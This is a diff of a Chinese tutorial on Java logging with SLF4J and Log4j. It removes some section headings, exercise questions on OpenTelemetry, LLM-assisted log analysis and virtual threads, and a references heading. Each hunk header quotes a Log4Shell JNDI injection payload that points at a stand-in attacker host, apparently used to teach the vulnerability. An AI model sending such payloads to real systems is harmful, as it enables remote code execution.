@@ -1734,8 +1734,6 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 
 ---
 
-## 知识讲解与要点分析（原习题）
-
 ### 9.1 基础题（记忆与理解）
 
 1. 列举 SLF4J 的 5 个日志级别，从低到高排列。
@@ -1793,18 +1791,6 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
     - 为什么 JNDI Lookup 会被引入日志框架？
     - 如何在架构层面避免类似漏洞？
 
-### 9.4 开放思考题
-
-13. 随着云原生和可观测性演进，传统日志是否会被 OpenTelemetry 的 Trace / Span 取代？阐述你的观点。
-
-14. 在 AI 时代，如何利用 LLM 辅助日志分析与故障定位？设计一个原型系统。
-
-15. 虚拟线程（JDK 21）对日志系统有何影响？MDC 在百万虚拟线程下是否会成为瓶颈？如何优化？
-
----
-
-## 10. 参考文献
-
 ### 10.1 官方文档
 
 1. SLF4J Official Documentation. https://www.slf4j.org/manual.html
@@ -1857,8 +1843,6 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 ```
 
 ---
-
-## 11. 延伸阅读
 
 ### 11.1 可观测性体系
 
